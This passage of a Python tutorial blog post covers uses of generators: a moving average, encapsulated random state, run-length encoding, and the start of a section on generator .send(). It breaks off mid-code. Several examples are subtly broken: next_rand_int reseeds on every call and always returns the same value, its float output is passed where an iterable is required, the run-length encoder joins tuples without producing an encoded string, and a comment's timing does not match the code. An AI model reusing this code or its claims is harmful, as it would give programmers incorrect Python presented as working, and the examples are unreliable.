<h2 class="anchor anchorWithStickyNavbar_LWe7" id="functions-internally-handling-state">Functions Internally Handling State<a href="https://clifford.ressel.fyi/blog/python-generators-part2#functions-internally-handling-state" class="hash-link" aria-label="Direct link to Functions Internally Handling State" title="Direct link to Functions Internally Handling State">​</a></h2>
<p>Both the previous use cases are common ones, made more concise through generators.
This use case and the next are less common use cases that are less about convenience, and more becoming <strong>possible</strong> with generators.
(Okay okay, that's not a challenge... There are definitely other ways to construct this logic! But I think these particular formations make me thankful for the tool.)</p>
<p>In a generalization from use case one, the internal state of a generator function is useful for more than just sequence-like behavior.
Although the most basic case of a generator is an iterator, which lends itself to sequence-like structures, it turns out to be very useful for other logic,
where some internal state that was mutated in between logical steps can now be encapsulated entirely into the function structure.</p>
<p>As a quick example of that "internal state," consider calculating a moving average.
There's a logical dependency between each step on all previous.
Generators will track solely that dependency, and leave the caller with their <code>Iterator</code> output:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> collections</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abc </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Iterable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Iterator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Union</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">moving_average</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> Iterable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Union</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">float</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Iterator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">float</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    _total </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    _count </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> item </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        _total </span><span class="token operator">+=</span><span class="token plain"> item</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        _count </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> _total </span><span class="token operator">/</span><span class="token plain"> _count</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># To the caller, it just looks like an Iterator</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">moving_average</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">11</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">77</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># And the abstraction still lets the caller proceed lazily if necessary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">start_time </span><span class="token operator">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">average </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 50 ms of moving average across some distribution</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> average </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> moving_average</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">rand_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token plain"> start_time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">1000</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">average</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>That's fine and well, maybe the shortest way to write that, but that only feels like a pure function if we're always casting the Iterator back to a list.</p>
<p>But something is missing from that code... What is the <code>next_rand_int</code> function?
Well I guess we want a different random number any time that function is called.
In fact, for a lot of randomness you might want that to be both deterministic for your application trace, and still random for all disparate callers.
The normal way to accomplish this is to feed the previous random as the following seed, but that requires all callers knowing if any other caller changed the seed.
The standard library achieves this with an instance of the <code>random.Random</code> class, which manages state for you.
In that case though, it can feel like you need a singleton or mono pattern for every code trace to get access to the same object instance.</p>
<p>Instead, we can just encapsulate the random state in our helper function:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> random </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Random</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MAX_RAND </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token operator">&lt;&lt;</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">rand_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">max_int</span><span class="token operator">=</span><span class="token plain">MAX_RAND</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Iterator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">float</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r </span><span class="token operator">=</span><span class="token plain"> Random</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> max_int</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">next_rand_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">max_int</span><span class="token operator">=</span><span class="token plain">MAX_RAND</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">float</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">rand_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">max_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># And with our previous example...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">start_time </span><span class="token operator">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">element </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> element </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> moving_average</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">next_rand_int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token plain"> start_time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">1000</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">element</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># We now see the uniform distribution here:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">element </span><span class="token operator">-</span><span class="token plain"> MAX_RAND </span><span class="token operator">/</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">1</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>It's important to note this is obviously <strong>not</strong> a truly pure function, as calling it with the same input will return different outputs.
As a programming paradigm though, it feels <em>closer</em> to functional than using a singleton pattern to host a <code>Random</code> instance.
When I before mentioned a "pure-looking function, with hidden internal state," that probably sounded oxymoronic.</p><p>What I'm calling "closer to functional" is maybe an implicit feeling that there is "program state," and then there is "world state," and <strong>when functional paradigms are most helpful is when they eliminate the program state</strong>.
When they feel obtuse and frustrating is often when they run up against the realities of hardware and the world state.</p><p>For several reasons, randomness feels like it belongs in that second category, alongside the system clock, runtime performance, and other realities of hardware.
The most pressing reason is that for a production release of your application, you may need to opaquely switch the <code>next_rand_int</code> implementation out with a <a href="https://en.wikipedia.org/wiki/List_of_random_number_generators#Random_number_generators_that_use_external_entropy" target="_blank" rel="noopener noreferrer">platform specific implementation</a>, or even one of <a href="https://en.wikipedia.org/wiki/Hardware_random_number_generator" target="_blank" rel="noopener noreferrer">extremely high entropy</a>, and that <em>actually will be</em> reliant on world state and the realities of hardware.</p></div></div>
<p>Just to quiet the functional nerd in me (and maybe in you), here is a useful example that actually does simplify a pure function implementation:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Iterable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Tuple</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">run_length_encoding</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">grouped</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> Iterable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Iterable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Tuple</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        iterator </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">iter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            _group </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iterator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            _count </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> StopIteration</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> item </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> iterator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> item </span><span class="token operator">==</span><span class="token plain"> _group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                _count </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">_count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> _group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                _group </span><span class="token operator">=</span><span class="token plain"> item</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                _count </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">_count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> _group</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    groups </span><span class="token operator">=</span><span class="token plain"> grouped</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">""</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">map</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> grouped</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">run_length_encoding</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"WWWWWWWWWWWWBW"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"WWWWWWWWWWWBBB"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"WWWWWWWWWWWWWW"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"WWWWWWWWWWBWWW"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"WWWWWWWWWWW"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="internally-managing-a-state-machine-with-caller-passed-input">Internally Managing a State Machine with Caller-Passed Input<a href="https://clifford.ressel.fyi/blog/python-generators-part2#internally-managing-a-state-machine-with-caller-passed-input" class="hash-link" aria-label="Direct link to Internally Managing a State Machine with Caller-Passed Input" title="Direct link to Internally Managing a State Machine with Caller-Passed Input">​</a></h2>
<p>Finally, the most general abstraction with generators is achieved when we bring in the <code>generator.send(...)</code> functionality.
In other languages, this functionality is called a <a href="https://en.wikipedia.org/wiki/Coroutine" target="_blank" rel="noopener noreferrer">coroutine</a>, but in Python that term is overloaded already with constructs from the <code>asyncio</code> module, so best to just referred to this as "generators with dot send."</p>
<p>Sending is the opposite of yielding.
When we use a generator, upon pausing the function frame and yielding control to the caller, we can yield some data along with that action.
Sending occurs when we resume the function frame, and along with that action we can also send along some data.
As a result, internal to the function implementation we could be controlling the state of the state machine, and each transition is eating some portion of the input as officiated by whatever the caller <code>.send()</code>'s:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Callable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Generator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> functools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> wraps</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">primed_coroutine</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span 